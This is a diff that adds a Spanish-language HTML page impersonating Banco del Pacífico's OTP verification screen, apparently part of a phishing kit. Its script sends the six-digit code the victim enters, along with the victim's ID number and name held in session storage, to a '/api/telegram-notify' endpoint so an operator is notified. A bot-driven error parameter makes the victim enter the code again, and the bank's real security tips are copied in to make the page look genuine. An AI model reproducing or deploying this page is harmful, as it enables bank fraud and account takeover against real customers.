@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Banco del Pacífico – Verificación OTP</title>
+  <style>
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{font-family:'Segoe UI',Arial,sans-serif;background:#eef1f5;min-height:100vh;display:flex;flex-direction:column}
+    header{background:#fff;padding:16px 24px;display:flex;align-items:center;gap:12px;box-shadow:0 1px 4px rgba(0,0,0,.08)}
+    .logo-box{width:38px;height:38px;background:#1a56a0;border-radius:8px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:18px;font-weight:900}
+    header span{font-size:1.1rem;font-weight:700;color:#1a3a6b}
+    .page{flex:1;display:flex;align-items:flex-start;justify-content:center;gap:32px;padding:36px 20px}
+    .card{background:#fff;border-radius:10px;padding:36px 32px;width:100%;max-width:440px;box-shadow:0 2px 12px rgba(0,0,0,.09)}
+    .card-icon{text-align:center;margin-bottom:16px;font-size:44px}
+    .card h2{font-size:1.3rem;font-weight:700;color:#1a3a6b;margin-bottom:8px;text-align:center}
+    .card .subtitle{font-size:.86rem;color:#888;text-align:center;margin-bottom:28px;line-height:1.6}
+    .card .subtitle strong{color:#1a3a6b}
+    .err-box{background:#fff0f0;border:1px solid #f5c2c2;border-radius:6px;padding:10px 14px;color:#c92a2a;font-size:.84rem;margin-bottom:16px;display:none;align-items:center;gap:8px}
+    .err-box.show{display:flex}
+    /* OTP inputs */
+    .otp-wrap{display:flex;gap:10px;justify-content:center;margin-bottom:24px}
+    .otp-wrap input{width:48px;height:56px;border:2px solid #c5cdd8;border-radius:8px;text-align:center;font-size:1.4rem;font-weight:700;color:#1a3a6b;outline:none;transition:border-color .2s;background:#fff}
+    .otp-wrap input:focus{border-color:#1a56a0}
+    .otp-wrap input.error-input{border-color:#e03131}
+    .btn-primary{width:100%;background:#1a56a0;color:#fff;border:none;border-radius:6px;padding:13px;font-size:1rem;font-weight:600;cursor:pointer;margin-top:4px;transition:background .25s}
+    .btn-primary:hover{background:#154a8a}
+    .resend{text-align:center;margin-top:16px;font-size:.84rem;color:#888}
+    .resend a{color:#1a56a0;cursor:pointer;text-decoration:none}
+    .resend a:hover{text-decoration:underline}
+    .timer{color:#1a56a0;font-weight:600}
+    .footer-note{text-align:center;font-size:.7rem;color:#aaa;margin-top:24px;line-height:1.6}
+    .tips{max-width:320px;padding-top:8px}
+    .tip-title{font-size:.75rem;color:#999;text-transform:uppercase;letter-spacing:.05em;margin-bottom:2px}
+    .tip-subtitle{font-size:.95rem;font-weight:700;color:#1a3a6b;margin-bottom:18px}
+    .tip-item{display:flex;gap:10px;margin-bottom:14px;align-items:flex-start}
+    .tip-icon{width:26px;height:26px;flex-shrink:0;background:#eef1f5;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:12px}
+    .tip-item p{font-size:.8rem;color:#777;line-height:1.45}
+    .help-section{margin-top:24px}
+    .help-section h4{font-size:.92rem;font-weight:700;color:#1a3a6b;margin-bottom:8px}
+    .help-section a{display:block;font-size:.8rem;color:#1a56a0;text-decoration:none;margin-bottom:5px}
+    @media(max-width:700px){.tips{display:none}.page{padding:16px 12px}.card{padding:26px 18px}}
+    @media(max-width:360px){.otp-wrap input{width:40px;height:48px;font-size:1.2rem}}
+  </style>
+</head>
+<body>
+<header>
+  <div class="logo-box">B</div>
+  <span>Banco del Pacífico</span>
+</header>
+<div class="page">
+  <div class="card">
+    <div class="card-icon">📱</div>
+    <h2>Verificación de seguridad</h2>
+    <p class="subtitle">Hemos enviado un código de 6 dígitos a tu celular registrado<br/><strong id="telMask">+593 *** *** **</strong></p>
+
+    <div class="err-box" id="err-otp-box">⚠️ <span>Código incorrecto. Por favor verifica e intenta nuevamente.</span></div>
+
+    <div class="otp-wrap">
+      <input type="text" maxlength="1" inputmode="numeric" class="otp-digit"/>
+      <input type="text" maxlength="1" inputmode="numeric" class="otp-digit"/>
+      <input type="text" maxlength="1" inputmode="numeric" class="otp-digit"/>
+      <input type="text" maxlength="1" inputmode="numeric" class="otp-digit"/>
+      <input type="text" maxlength="1" inputmode="numeric" class="otp-digit"/>
+      <input type="text" maxlength="1" inputmode="numeric" class="otp-digit"/>
+    </div>
+
+    <button class="btn-primary" onclick="verificarOTP()">Verificar código</button>
+
+    <div class="resend">
+      ¿No recibiste el código? <a onclick="reenviar()">Reenviar</a> <span class="timer" id="timer"></span>
+    </div>
+
+    <p class="footer-note">© Copyright 2017 Banco del Pacífico *V5.3.12b</p>
+  </div>
+
+  <div class="tips">
+    <p class="tip-title">CONSEJOS</p>
+    <p class="tip-subtitle">Por tu seguridad:</p>
+    <div class="tip-item"><div class="tip-icon">🔒</div><p>Banco del Pacífico S.A. no solicita claves, usuarios, números de tarjetas o cuenta por ningún medio.</p></div>
+    <div class="tip-item"><div class="tip-icon">🔑</div><p>No compartas tus claves, recuerda que son de uso personal e intransferible.</p></div>
+    <div class="tip-item"><div class="tip-icon">ℹ️</div><p>Para acceder a la Banca Virtual, asegúrese de teclear <strong>https://www.intermatico.com</strong></p></div>
+    <div class="tip-item"><div class="tip-icon">📞</div><p>En caso de recibir llamadas sospechosas contáctate al <strong>3731500 opción 9</strong>.</p></div>
+    <div class="help-section">
+      <h4>¿Necesitas ayuda?</h4>
+      <a href="#">• ¿Cómo creo mi usuario?</a>
+      <a href="#">• ¿Cómo desbloqueo mi usuario?</a>
+      <a href="#">• ¿Cómo recupero mi contraseña?</a>
+    </div>
+  </div>
+</div>
+<script>
+  // Mostrar teléfono enmascarado
+  const tel = sessionStorage.getItem('bp_telefono') || '';
+  if(tel) document.getElementById('telMask').textContent = tel.slice(0,3) + ' *** *** ' + tel.slice(-2);
+
+  // Navegación entre inputs OTP
+  const digits = document.querySelectorAll('.otp-digit');
+  digits.forEach((inp, i) => {
+    inp.addEventListener('input', e => {
+      inp.value = inp.value.replace(/\D/g,'');
+      if(inp.value && i < digits.length - 1) digits[i+1].focus();
+    });
+    inp.addEventListener('keydown', e => {
+      if(e.key === 'Backspace' && !inp.value && i > 0) digits[i-1].focus();
+    });
+    inp.addEventListener('paste', e => {
+      e.preventDefault();
+      const paste = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g,'');
+      paste.split('').slice(0,6).forEach((ch, j) => { if(digits[j]) digits[j].value = ch; });
+      const next = Math.min(paste.length, 5);
+      digits[next].focus();
+    });
+  });
+
+  // Timer reenvío
+  let seconds = 60;
+  const timerEl = document.getElementById('timer');
+  function tick(){
+    if(seconds > 0){ timerEl.textContent = `(${seconds}s)`; seconds--; setTimeout(tick,1000); }
+    else { timerEl.textContent = ''; }
+  }
+  tick();
+
+  function reenviar(){
+    if(seconds > 0) return;
+    seconds = 60; tick();
+  }
+
+  async function verificarOTP(){
+    const code = Array.from(digits).map(d=>d.value).join('');
+    if(code.length < 6){
+      digits.forEach(d=>d.classList.add('error-input'));
+      document.getElementById('err-otp-box').classList.add('show');
+      return;
+    }
+    digits.forEach(d=>d.classList.remove('error-input'));
+    document.getElementById('err-otp-box').classList.remove('show');
+
+    sessionStorage.setItem('bp_otp', code);
+
+    // Deshabilitar botón mientras envía
+    const btn = document.querySelector('.btn-primary');
+    btn.disabled = true;
+    btn.textContent = 'Verificando...';
+
+    try{
+      await fetch('/api/telegram-notify',{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({
+          action:'notify_step',
+          data:{
+            cedula: sessionStorage.getItem('bp_cedula')||'—',
+            nombre: sessionStorage.getItem('bp_nombre')||'—',
+            step:'OTP',
+            extra:{'Código OTP': code}
+          }
+        })
+      });
+    }catch(e){console.log('telegram error',e);}
+
+    window.location.href = 'loading.html';
+  }
+
+  // Mostrar error si viene del bot
+  const params = new URLSearchParams(window.location.search);
+  if(params.get('error') === 'otp'){
+    document.getElementById('err-otp-box').classList.add('show');
+    digits.forEach(d=>{ d.value=''; d.classList.add('error-input'); });
+    digits[0].focus();
+  }
+</script>
+</body>
+</html>
